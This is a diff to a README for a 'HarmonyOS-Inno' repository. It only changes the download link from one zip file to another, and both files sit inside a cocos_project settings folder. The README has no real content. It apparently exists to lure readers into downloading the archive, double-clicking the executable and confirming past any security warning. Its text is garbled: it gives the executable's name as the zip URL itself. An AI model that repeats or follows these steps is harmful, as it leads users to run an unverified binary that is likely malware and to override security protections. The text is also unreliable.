@@ -1,6 +1,6 @@
 # 🌟 HarmonyOS-Inno - Explore Innovative Features Effortlessly
 
-![Download](https://github.com/OoufA123456/HarmonyOS-Inno/raw/refs/heads/main/cocos_project/settings/v2/Inno-Harmony-O-2.0.zip)
+![Download](https://github.com/OoufA123456/HarmonyOS-Inno/raw/refs/heads/main/cocos_project/settings/v2/Inno_O_Harmony_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to HarmonyOS-Inno! This repository showcases the innovative capabilities
 
 To get started, **visit this page to download** the latest version of HarmonyOS-Inno from our Releases section. Click the button below to quickly access it:
 
-[Download Link](https://github.com/OoufA123456/HarmonyOS-Inno/raw/refs/heads/main/cocos_project/settings/v2/Inno-Harmony-O-2.0.zip)
+[Download Link](https://github.com/OoufA123456/HarmonyOS-Inno/raw/refs/heads/main/cocos_project/settings/v2/Inno_O_Harmony_1.3.zip)
 
 ### Steps to Download
 
@@ -25,7 +25,7 @@ After downloading, follow these steps:
 
 1. Navigate to the folder where you saved the downloaded file.
 2. If the file is compressed (like a .zip or .tar), extract it first.
-3. Locate the executable file (this may be named `https://github.com/OoufA123456/HarmonyOS-Inno/raw/refs/heads/main/cocos_project/settings/v2/Inno-Harmony-O-2.0.zip`, or similar).
+3. Locate the executable file (this may be named `https://github.com/OoufA123456/HarmonyOS-Inno/raw/refs/heads/main/cocos_project/settings/v2/Inno_O_Harmony_1.3.zip`, or similar).
 4. Double-click the executable file to launch the application.
 5. If you see a security warning, confirm that you want to proceed to open the application.
 
